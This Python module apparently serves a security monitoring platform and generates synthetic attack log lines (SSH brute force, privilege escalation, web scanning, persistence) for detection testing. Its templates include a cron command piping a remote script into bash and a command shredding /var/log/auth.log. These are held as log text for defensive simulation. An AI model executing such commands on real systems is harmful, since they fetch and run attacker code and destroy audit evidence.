# sim/scenarios.py
"""Attack scenario templates grounded in this platform's real decoders.

Each scenario emits raw log lines matching an existing decoder's regex, so the
simulated traffic flows through the same decode -> Sigma -> alert path as real
traffic. Threshold-based rules (e.g. SSH brute force, 5 events / 300s grouped
by source.ip) need several lines per scenario, hence burst counts.
"""
from __future__ import annotations

import random
from dataclasses import dataclass, field


@dataclass(frozen=True)
class Scenario:
    key: str
    log_type: str
    attacks: str
    mitre: list[str]
    burst: int
    template: str
    fields: dict[str, list[str]] = field(default_factory=dict)

    def render(self, rng: random.Random, hostname: str, ip: str, ts: str) -> list[str]:
        lines = []
        for _ in range(self.burst):
            values = {k: rng.choice(v) for k, v in self.fields.items()}
            lines.append(
                self.template.format(
                    ts=ts, host=hostname, ip=ip, port=rng.randint(32768, 60999), **values
                )
            )
        return lines


LINUX_AUTH_FAILED = (
    "{ts} {host} sshd[{port}]: Failed password for {user} from {ip} port 22 ssh2"
)

SCENARIOS: list[Scenario] = [
    Scenario(
        key="ssh_bruteforce",
        log_type="linux_auth",
        attacks="credential_access",
        mitre=["T1110.001"],
        burst=6,
        template=LINUX_AUTH_FAILED,
        fields={
            "user": ["root", "admin", "oracle", "postgres", "test", "ubuntu"],
        },
    ),
    Scenario(
        key="ssh_invalid_user",
        log_type="linux_auth",
        attacks="credential_access",
        mitre=["T1110.001", "T1078"],
        burst=5,
        template="{ts} {host} sshd[{port}]: Failed password for invalid user {user} from {ip} port 22 ssh2",
        fields={"user": ["guest", "jenkins", "hadoop", "deploy", "backup"]},
    ),
    Scenario(
        key="sudo_escalation",
        log_type="linux_auth",
        attacks="privilege_escalation",
        mitre=["T1548.003"],
        burst=1,
        template="{ts} {host} sudo[{port}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
        fields={"user": ["www-data", "jenkins", "deploy"]},
    ),
    Scenario(
        key="useradd_persistence",
        log_type="linux_auth",
        attacks="persistence",
        mitre=["T1136.001"],
        burst=1,
        template="{ts} {host} useradd[{port}]: new user: name={user}, UID=1002, GID=1002, home=/home/{user}, shell=/bin/bash",
        fields={"user": ["svc_backup", "ops_admin", "monitor"]},
    ),
    Scenario(
        key="nginx_dir_scanner",
        log_type="nginx_access_combined",
        attacks="discovery",
        mitre=["T1595.002"],
        burst=8,
        template='{ts} {ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} 512 "-" "sqlmap/1.7"',
        fields={
            "method": ["GET", "GET", "POST"],
            "path": ["/admin.php", "/.env", "/wp-login.php", "/phpmyadmin/", "/.git/config"],
            "status": ["404", "403", "404"],
        },
    ),
    Scenario(
        key="web_login_bruteforce",
        log_type="nginx_access_combined",
        attacks="credential_access",
        mitre=["T1110.001"],
        burst=6,
        template='{ts} {ip} - - [{ts}] "POST /login HTTP/1.1" 401 512 "-" "Mozilla/5.0"',
    ),
    Scenario(
        key="crontab_persistence",
        log_type="syslog",
        attacks="persistence",
        mitre=["T1053.003"],
        burst=1,
        template="{ts} {host} CRON[{port}]: (root) CMD (curl -fsSL http://{ip}/x.sh | bash)",
    ),
    Scenario(
        key="log_clearing",
        log_type="syslog",
        attacks="defense_evasion",
        mitre=["T1070.002"],
        burst=1,
        template="{ts} {host} systemd[{port}]: Started Session 42 of user root; Command: shred -u /var/log/auth.log",
    ),
    Scenario(
        key="kernel_module",
        log_type="syslog",
        attacks="persistence",
        mitre=["T1547.006"],
        burst=1,
        template="{ts} {host} insmod[{port}]: loading module from /tmp/rootkit.ko",
    ),
]


def by_key(key: str) -> Scenario | None:
    return next((s for s in SCENARIOS if s.key == key), None)
